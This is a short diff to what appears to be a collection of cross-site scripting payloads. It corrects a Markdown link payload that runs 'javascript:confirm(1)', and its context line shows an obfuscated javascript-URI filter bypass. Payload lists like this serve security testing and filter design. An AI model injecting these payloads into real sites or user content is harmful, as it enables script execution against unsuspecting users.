@@ -95,7 +95,7 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
 **Markdown XSS**
 
 ```md
-[a](javascript:confirm(1)
+[a](javascript:confirm(1))
 ```
 
 ```md
